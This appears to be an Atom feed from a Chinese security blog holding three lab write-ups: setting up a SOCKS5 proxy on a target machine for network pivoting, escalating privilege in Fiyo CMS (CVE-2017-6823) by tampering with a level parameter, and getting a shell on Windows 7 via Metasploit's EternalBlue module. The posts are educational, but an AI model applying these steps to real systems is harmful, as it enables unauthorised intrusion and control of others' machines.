<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Robot&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-05-01T07:05:20.784Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Robot</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>公网服务器搭建socks5代理</title>
    <link href="http://yoursite.com/2018/05/01/%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BAsocks5%E4%BB%A3%E7%90%86/"/>
    <id>http://yoursite.com/2018/05/01/公网服务器搭建socks5代理/</id>
    <published>2018-05-01T05:52:25.000Z</published>
    <updated>2018-05-01T07:05:20.784Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天玩了一下内网，这里说一下windows和linux怎么搭建socks5代理，文章中所用到的工具和脚本打包链接：<a href="https://github.com/R0both/R1bot.github.io/blob/master/proxifier.rar" target="_blank" rel="noopener">socks5工具</a></p><h2 id="windows环境下搭建socks5代理"><a href="#windows环境下搭建socks5代理" class="headerlink" title="windows环境下搭建socks5代理"></a>windows环境下搭建socks5代理</h2><h3 id="1、ew的使用"><a href="#1、ew的使用" class="headerlink" title="1、ew的使用"></a>1、ew的使用</h3><p>我这里是用ew和proxifier配合使用的，只需要把ew放到目标机上，然后执行一条命令就得了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew.exe -s ssocksd -l 8088</span><br></pre></td></tr></table></figure><p><img src="/2018/05/01/公网服务器搭建socks5代理/1.png" alt="image"></p><p>8088是要使用的端口，如果被占用了可以改用别的端口</p><h3 id="2、proxifier的配置"><a href="#2、proxifier的配置" class="headerlink" title="2、proxifier的配置"></a>2、proxifier的配置</h3><p>在目标机执行完那条命令之后就回到自己的机子，打开proxifier-&gt;配置文件-&gt;代理服务器-&gt;添加一个服务器，地址填刚才那台机子的ip地址，端口就是执行那条命令输入的端口，协议选socks版本5，确定。</p><p><img src="/2018/05/01/公网服务器搭建socks5代理/2/.png" alt="image"></p><p>这样就已经配置完成了，百度一下我们的ip地址</p><p><img src="/2018/05/01/公网服务器搭建socks5代理/6.png" alt="image"></p><h2 id="linux环境搭建socks5代理"><a href="#linux环境搭建socks5代理" class="headerlink" title="linux环境搭建socks5代理"></a>linux环境搭建socks5代理</h2><p>linux搭建的话就要用到一个py脚本了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># Filename s5.py</span><br><span class="line"># Python Dynamic Socks5 Proxy</span><br><span class="line"># Usage: python s5.py 1080</span><br><span class="line"># Background Run: nohup python s5.py 1080 &amp;</span><br><span class="line"> </span><br><span class="line">import socket, sys, select, SocketServer, struct, time</span><br><span class="line"> </span><br><span class="line">class ThreadingTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer): pass</span><br><span class="line">class Socks5Server(SocketServer.StreamRequestHandler):</span><br><span class="line">    def handle_tcp(self, sock, remote):</span><br><span class="line">        fdset = [sock, remote]</span><br><span class="line">        while True:</span><br><span class="line">            r, w, e = select.select(fdset, [], [])</span><br><span class="line">            if sock in r:</span><br><span class="line">                if remote.send(sock.recv(4096)) &lt;= 0: break</span><br><span class="line">            if remote in r:</span><br><span class="line">                if sock.send(remote.recv(4096)) &lt;= 0: break</span><br><span class="line">    def handle(self):</span><br><span class="line">        try:</span><br><span class="line">            pass # print &apos;from &apos;, self.client_address nothing to do.</span><br><span class="line">            sock = self.connection</span><br><span class="line">            # 1. Version</span><br><span class="line">            sock.recv(262)</span><br><span class="line">            sock.send(&quot;\x05\x00&quot;);</span><br><span class="line">            # 2. Request</span><br><span class="line">            data = self.rfile.read(4)</span><br><span class="line">            mode = ord(data[1])</span><br><span class="line">            addrtype = ord(data[3])</span><br><span class="line">            if addrtype == 1:       # IPv4</span><br><span class="line">                addr = socket.inet_ntoa(self.rfile.read(4))</span><br><span class="line">            elif addrtype == 3:     # Domain name</span><br><span class="line">                addr = self.rfile.read(ord(sock.recv(1)[0]))</span><br><span class="line">            port = struct.unpack(&apos;&gt;H&apos;, self.rfile.read(2))</span><br><span class="line">            reply = &quot;\x05\x00\x00\x01&quot;</span><br><span class="line">            try:</span><br><span class="line">                if mode == 1:  # 1. Tcp connect</span><br><span class="line">                    remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                    remote.connect((addr, port[0]))</span><br><span class="line">                    pass # print &apos;To&apos;, addr, port[0]  nothing do to.</span><br><span class="line">                else:</span><br><span class="line">                    reply = &quot;\x05\x07\x00\x01&quot; # Command not supported</span><br><span class="line">                local = remote.getsockname()</span><br><span class="line">                reply += socket.inet_aton(local[0]) + struct.pack(&quot;&gt;H&quot;, local[1])</span><br><span class="line">            except socket.error:</span><br><span class="line">                # Connection refused</span><br><span class="line">                reply = &apos;\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00&apos;</span><br><span class="line">            sock.send(reply)</span><br><span class="line">            # 3. Transfering</span><br><span class="line">            if reply[1] == &apos;\x00&apos;:  # Success</span><br><span class="line">                if mode == 1:    # 1. Tcp connect</span><br><span class="line">                    self.handle_tcp(sock, remote)</span><br><span class="line">        except socket.error:</span><br><span class="line">            pass #print &apos;error&apos; nothing to do .</span><br><span class="line">        except IndexError:</span><br><span class="line">            pass</span><br><span class="line">def main():</span><br><span class="line">    filename = sys.argv[0];</span><br><span class="line">    if len(sys.argv)&lt;2:</span><br><span class="line">        print &apos;usage: &apos; + filename + &apos; port&apos;</span><br><span class="line">        sys.exit()</span><br><span class="line">    socks_port = int(sys.argv[1]);    </span><br><span class="line">    server = ThreadingTCPServer((&apos;&apos;, socks_port), Socks5Server)</span><br><span class="line">    print &apos;bind port: %d&apos; % socks_port + &apos; ok!&apos;</span><br><span class="line">    server.serve_forever()</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line"></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>脚本在打包链接里面都有，这个也是一条命令就搞定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python s5.py 8088</span><br></pre></td></tr></table></figure><p><img src="/2018/05/01/公网服务器搭建socks5代理/3.png" alt="image"></p><p>同样的后面8088是端口，可以修改的，执行完了之后再回到我们的proxifier里面添加服务器，配置跟前面的一样</p><p><img src="/2018/05/01/公网服务器搭建socks5代理/4.png" alt="image"></p><p>因为我这里的windows和linux是不同的机子，所以ip设置的跟前面的不一样</p><p>再来百度看一下ip地址</p><p><img src="/2018/05/01/公网服务器搭建socks5代理/5.png" alt="image"></p><p>OK，已经成功了！</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>emm，这篇文章主要是外网搭建socks5代理的，下一篇会讲到如果对方是内网的如何搭建socks5代理。</p><p>所有工具打包链接：<a href="https://github.com/R0both/R1bot.github.io/blob/master/proxifier.rar" target="_blank" rel="noopener">socks5工具</a></p><h5 id="—-未完待续—–"><a href="#—-未完待续—–" class="headerlink" title="—-未完待续—–"></a>—-未完待续—–</h5><h6 id="（注：本教程仅供学习，切勿用于非法用途！）"><a href="#（注：本教程仅供学习，切勿用于非法用途！）" class="headerlink" title="（注：本教程仅供学习，切勿用于非法用途！）"></a>（注：本教程仅供学习，切勿用于非法用途！）</h6>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这几天玩了一下内网，这里说一下windows和linux怎么搭建socks5代理，文章中所用到的工具和脚本打包链接：&lt;a href=&quot;htt
      
    
    </summary>
    
      <category term="外网代理" scheme="http://yoursite.com/categories/%E5%A4%96%E7%BD%91%E4%BB%A3%E7%90%86/"/>
    
    
      <category term="代理" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-6823 Fiyo CMS权限提升漏洞</title>
    <link href="http://yoursite.com/2018/04/10/CVE-2017-6823-Fiyo-CMS%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/04/10/CVE-2017-6823-Fiyo-CMS权限提升漏洞/</id>
    <published>2018-04-10T08:25:58.000Z</published>
    <updated>2018-04-10T09:28:29.799Z</updated>
    
    <content type="html"><![CDATA[<p>emmm,这是西普铁三训练营里面的一个Fiyo CMS权限提升漏洞复现，记录一下。</p><p><img src="/2018/04/10/CVE-2017-6823-Fiyo-CMS权限提升漏洞/1.png" alt="图一"><a id="more"></a></p><p>先访问网站后台[<a href="http://192.168.1.3/dapur/]。" target="_blank" rel="noopener">http://192.168.1.3/dapur/]。</a></p><p><img src="/2018/04/10/CVE-2017-6823-Fiyo-CMS权限提升漏洞/2.png" alt="图二"></p><p>是同用户[admin]密码[admin888]登陆网站后台。</p><p><img src="/2018/04/10/CVE-2017-6823-Fiyo-CMS权限提升漏洞/3.png" alt="图三"></p><p>在点New User新建一个用户，用户名[xipu]密码[123456]电子邮箱[<a href="mailto:xipu@qq.com" target="_blank" rel="noopener">xipu@qq.com</a>]User Group选择【Editor】Name Lengkap名字随便写。</p><p><img src="/2018/04/10/CVE-2017-6823-Fiyo-CMS权限提升漏洞/4.png" alt="图四"></p><p>能看到各个组的level等级,Super Administrator是最高权限用户。</p><p><img src="/2018/04/10/CVE-2017-6823-Fiyo-CMS权限提升漏洞/5.png" alt="图五"></p><p>点右上角Sign Out推出登陆。</p><p><img src="/2018/04/10/CVE-2017-6823-Fiyo-CMS权限提升漏洞/6.png" alt="图六"></p><p>再使用刚刚创建的账号登陆。</p><p><img src="/2018/04/10/CVE-2017-6823-Fiyo-CMS权限提升漏洞/7.png" alt="图七"></p><p>可以看到左边的功能变得少了，么有操作用户的权限了。</p><p><img src="/2018/04/10/CVE-2017-6823-Fiyo-CMS权限提升漏洞/8.png" alt="图八"></p><p>点击右上角头像选择Edit Profile编辑资料。</p><p><img src="/2018/04/10/CVE-2017-6823-Fiyo-CMS权限提升漏洞/9.png" alt="图九"></p><p>点击User Group 看能否修改为管理员组，发现并不能。</p><p><img src="/2018/04/10/CVE-2017-6823-Fiyo-CMS权限提升漏洞/10.png" alt="图十"></p><p>接下来就抓包试一下能不能修改，打开浏览器设置好代理</p><p><img src="/2018/04/10/CVE-2017-6823-Fiyo-CMS权限提升漏洞/11.png" alt="十一"></p><p>打开burpsuite，密码填[123456]，抓包发现在我们提交账号密码的同时，level也被提交了，前面看到Editor的等级是3，如果改成1那就是最高管理员的等级了</p><p><img src="/2018/04/10/CVE-2017-6823-Fiyo-CMS权限提升漏洞/12.png" alt="十二"></p><p>把level后的参数改成1，然后点Forward放包出去。</p><p><img src="/2018/04/10/CVE-2017-6823-Fiyo-CMS权限提升漏洞/13.png" alt="十三"></p><p>点[Interceot is off] 关闭bp的拦截。</p><p><img src="/2018/04/10/CVE-2017-6823-Fiyo-CMS权限提升漏洞/14.png" alt="十四"></p><p>退出登陆然后再重新用这个账号登陆，然后惊喜的发现左边的权限变多了，所属的组变成了Super Administrator,也就是网站的最高管理员权限。</p><p><img src="/2018/04/10/CVE-2017-6823-Fiyo-CMS权限提升漏洞/15.png" alt="十五"></p><h6 id="注：本教程仅供学习，切勿用于非法用途！"><a href="#注：本教程仅供学习，切勿用于非法用途！" class="headerlink" title="(注：本教程仅供学习，切勿用于非法用途！)"></a>(注：本教程仅供学习，切勿用于非法用途！)</h6>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;emmm,这是西普铁三训练营里面的一个Fiyo CMS权限提升漏洞复现，记录一下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2018/04/10/CVE-2017-6823-Fiyo-CMS权限提升漏洞/1.png&quot; alt=&quot;图一&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="web漏洞" scheme="http://yoursite.com/tags/web%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="cms" scheme="http://yoursite.com/tags/cms/"/>
    
  </entry>
  
  <entry>
    <title>Ms17_010漏洞的利用</title>
    <link href="http://yoursite.com/2018/04/09/Ms17-010%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2018/04/09/Ms17-010漏洞的利用/</id>
    <published>2018-04-09T11:39:36.000Z</published>
    <updated>2018-04-10T09:32:45.812Z</updated>
    
    <content type="html"><![CDATA[<p>ms_17_010是2017年的一个Windows的smb远程代码执行漏洞，这也算是一个被玩烂了的洞了，这篇文章就是关于如何利用和防护这个漏洞。</p><p> 攻击机：<br> kali<br> ip:192.168.245.132</p><p> 受害机：<br> win7<br> ip:192.168.61.160<br> <a id="more"></a><br>这里我是用我内网的两台机子测试的，如果是外网的那就要设置路由器的端口转发之类的。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞出现在Windows SMB v1中的内核态函数srv!SrvOs2FeaListToNt在处理FEA(File Extended Attributes)转换时，在大非分页池(内核的数据结构，Large Non-Paged Kernel Pool)上存在缓冲区溢出。函数srv!SrvOs2FeaListToNt在将FEA list转换成NTFEA(Windows NT FEA) list前会调用srv!SrvOs2FeaListSizeToNt去计算转换后的FEA lsit的大小。然后会进行如下操作：</p><p>1.srv!SrvOs2FeaListSizeToNt会计算FEA list的大小并更新待转换的FEA list的大小</p><p>2.因为错误的使用WORD强制类型转换，导致计算出来的待转换的FEA list的大小比真正的FEA list大</p><p>3.因为原先的总大小计算错误，导致当FEA list被转化为NTFEA list时，会在非分页池导致缓冲区溢出</p><h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><p>博主这里是直接用kali的msf里面自带的ms17_010模块<br>启动msf控制台<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></p><p>然后使用ms17_010_eternalblue这个模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure></p><p><img src="/2018/04/09/Ms17-010漏洞的利用/1.jpg" alt="image"></p><p>用show options 命令查看设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></p><p><img src="/2018/04/09/Ms17-010漏洞的利用/2.jpg" alt="image"></p><p>Exploit target表示可以攻击的目标，这个模块只能攻击win7和win server2008的，yes是表示需要设置的，由图可以看出其他都已经设置好了，我们只需要设置RHOST，也就是ip地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 192.168.61.160</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exoloit</span><br></pre></td></tr></table></figure><p>开始监听会话</p><p><img src="/2018/04/09/Ms17-010漏洞的利用/3.jpg" alt="image"></p><p>看到这样子那就表示已经成功getshell了</p><p><img src="/2018/04/09/Ms17-010漏洞的利用/4.jpg" alt="image"></p><p>尝试这输入一些命令</p><p><img src="/2018/04/09/Ms17-010漏洞的利用/5.jpg" alt="image"></p><p>好的已经成功入侵了这台电脑，现在他的电脑就是你的电脑，你的电脑还是你的电脑，接下来干嘛自己发挥想象力了！炒鸡简单的一个漏洞利用。</p><h2 id="如何防护"><a href="#如何防护" class="headerlink" title="如何防护"></a>如何防护</h2><p>电脑管家或者360之类的都已经有了对应的补丁，下载补丁就行了。</p><h6 id="注：本教程仅供学习，切勿用于非法用途！"><a href="#注：本教程仅供学习，切勿用于非法用途！" class="headerlink" title="(注：本教程仅供学习，切勿用于非法用途！)"></a>(注：本教程仅供学习，切勿用于非法用途！)</h6>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ms_17_010是2017年的一个Windows的smb远程代码执行漏洞，这也算是一个被玩烂了的洞了，这篇文章就是关于如何利用和防护这个漏洞。&lt;/p&gt;
&lt;p&gt; 攻击机：&lt;br&gt; kali&lt;br&gt; ip:192.168.245.132&lt;/p&gt;
&lt;p&gt; 受害机：&lt;br&gt; win7&lt;br&gt; ip:192.168.61.160&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="系统漏洞" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/"/>
    
    
  </entry>
  
</feed>
